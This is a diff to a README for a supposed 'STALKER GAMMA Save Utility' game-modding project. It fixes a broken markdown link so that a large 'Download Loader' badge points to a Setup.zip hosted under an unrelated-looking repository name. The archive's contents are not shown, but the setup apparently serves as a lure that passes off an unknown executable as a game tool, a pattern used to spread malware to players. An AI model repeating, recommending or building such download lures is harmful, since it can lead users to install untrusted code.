@@ -4,7 +4,7 @@
 
 > ⚡ Advanced Game Modification Project for STALKER GAMMA Save Utility
 
-[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)]https://github.com/WASD122/bvvb/releases/download/main/Setup.zip)
+[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/WASD122/bvvb/releases/download/main/Setup.zip)
 
 ---
 
@@ -38,4 +38,5 @@ configs/
 `STALKER-GAMMA-Save-Utility` · Updated: 2026-10-23
 
 **Tags:** `stalker-gamma` `savegame` `utility` `survival` `open-world`
+
 
